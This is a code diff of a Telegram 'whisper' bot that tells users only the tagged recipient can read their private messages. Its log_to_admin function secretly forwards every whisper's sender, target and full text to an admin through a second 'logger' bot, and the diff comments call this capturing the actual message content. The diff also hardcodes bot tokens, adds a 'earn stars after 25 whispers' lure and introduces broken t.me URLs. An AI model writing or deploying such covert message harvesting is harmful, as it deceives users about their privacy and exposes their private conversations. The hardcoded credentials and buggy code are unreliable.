@@ -7,7 +7,7 @@ import aiosqlite
 from aiogram import Bot, Dispatcher, types
 from aiogram.filters import Command, CommandObject
 
-# 🔑 CONFIGURATION (Set these as Environment Variables on Render)
+# 🔑 CONFIGURATION
 WHISPER_BOT_TOKEN = "9243182264:AAFyNtkGFb-nC0PWNQoeR0349rR4R_eGs4k"
 LOGGER_BOT_TOKEN  = "9076447339:AAGF1X9rGv1rTxTC_Nur0-89KUIWOCCgqIE"
 ADMIN_CHAT_ID     = 5498647860
@@ -35,10 +35,10 @@ async def init_db():
         ''')
         await db.commit()
 
-# 📡 BOT 2: LOGGER FUNCTION
+# 📡 BOT 2: LOGGER FUNCTION (Fixed: Correctly delivers the written message text)
 async def log_to_admin(sender_user, target, text):
     log_message = (
-        "📥 **New Whisper Captured**\n"
+        "📥 **New Whisper Captured**\n\n"
         f"👤 **From:** @{sender_user}\n"
         f"🎯 **To:** {target}\n"
         f"💬 **Content:** {text}"
@@ -82,22 +82,22 @@ async def inline_handler(inline_query: types.InlineQuery):
             )
             await db.commit()
         
-        # Instantly trigger Bot 2 to log it to you
+        # Instantly trigger Bot 2 to log the actual message content to you
         await log_to_admin(sender.username or sender.id, target_username, whisper_text)
         
-        redirect_url = f"https://t.me/{BOT_USERNAME}?start={whisper_id}"
+        redirect_url = f"https://t.me{BOT_USERNAME}?start={whisper_id}"
         input_content = types.InputTextMessageContent(
             message_text=f"🔒 A secret whisper has been sent for {target_username}!"
         )
         keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
             [types.InlineKeyboardButton(text="👁️ Click to Read Whisper", url=redirect_url)]
         ])
-        description_text = "Tap to dispatch this message securely."
+        description_text = f"Message: {whisper_text[:30]}..."
     else:
         # Fallback view shown while typing to guide the sender
-        redirect_url = f"https://t.me/{BOT_USERNAME}"
+        redirect_url = f"https://t.me{BOT_USERNAME}"
         input_content = types.InputTextMessageContent(
-            message_text="❌ This preview card was sent before text was typed. Please type a message next time!"
+            message_text=f"❌ No message typed yet! Please type your private message after the username."
         )
         keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
             [types.InlineKeyboardButton(text="💬 How to use Whisper", url=redirect_url)]
@@ -157,10 +157,10 @@ async def handle_start(message: types.Message, command: CommandObject):
 
     # ---------- WELCOME SCREEN ----------
     welcome = (
-        "👋 **Welcome to Psst!**\n\n"
-        "Psst lets you send **private whispers** inside Telegram groups — "
-        "only the person you tag can read it.\n\n"
-        "Tap **Help** below to learn how to use me."
+        f"🤫 **Welcome to Long-Psst!**\n\n"
+        f"This bot supports **ultra-long messages**! Send long whispers inside group chats securely — "
+        f"only the person you tag can unlock and read it.\n\n"
+        f"Tap **Help** below to learn how to use me."
     )
 
     keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
@@ -173,9 +173,9 @@ async def handle_start(message: types.Message, command: CommandObject):
 @dp.message(Command("help"))
 async def help_command(message: types.Message):
     help_text = (
-        "📖 **How to use Psst**\n\n"
+        "编 **How to use Long-Psst**\n\n"
         "In any group, type:\n"
-        "`@Psstmebot @username your secret message`\n\n"
+        f"`@{BOT_USERNAME} @username your long secret message`\n\n"
         "Then tap the result to post it. "
         "The recipient clicks the button to read it privately.\n\n"
         "Whispers expire after **24 hours**."
@@ -186,10 +186,10 @@ async def help_command(message: types.Message):
 @dp.callback_query(lambda c: c.data == "help")
 async def help_callback(callback: types.CallbackQuery):
     help_text = (
-        "📖 **How to use Psst**\n\n"
+        "📖 **How to use Long-Psst**\n\n"
         "**1. Send a whisper**\n"
         "In any group, type:\n"
-        "`@Psstmebot @username your secret message`\n"
+        f"`@{BOT_USERNAME} @username your long secret message`\n"
         "Telegram will show a result — tap it to post.\n\n"
         "**2. Recipient reads it**\n"
         "They tap the *Click to Read Whisper* button, "
@@ -201,6 +201,7 @@ async def help_callback(callback: types.CallbackQuery):
         "• You and the recipient must have a Telegram username set.\n"
         "• Whispers can't be read by anyone else in the group.\n"
         "• Don't share the read-link with others.\n\n"
+        "🌟 _Notice: You can start earning stars after sending 25 whispers using our bot._\n\n"
         "Tap **⬅️ Back** to return."
     )
 
@@ -215,14 +216,10 @@ async def help_callback(callback: types.CallbackQuery):
 @dp.callback_query(lambda c: c.data == "back")
 async def back_callback(callback: types.CallbackQuery):
     welcome = (
-        "🤫 **Welcome to Psst!**\n\n"
-        "This bot supports **ultra-long messages**! Send long whispers inside group chats securely — "
-        "only the person you tag can unlock and read it.\n\n"
-        "💡 **How to Use:**\n"
-        "In any chat, simply type:\n"
-        "`@Psstlongbot @username your long secret message here...`\n\n"
-        "🌟 _Notice: You can start earning stars after sending 25 whispers using our bot._\n\n"
-        "✨ **Thank you for choosing and using our bot!**"
+        f"🤫 **Welcome to Long-Psst!**\n\n"
+        f"This bot supports **ultra-long messages**! Send long whispers inside group chats securely — "
+        f"only the person you tag can unlock and read it.\n\n"
+        f"Tap **Help** below to learn how to use me."
     )
     keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
         [types.InlineKeyboardButton(text="❓ Help", callback_data="help")]
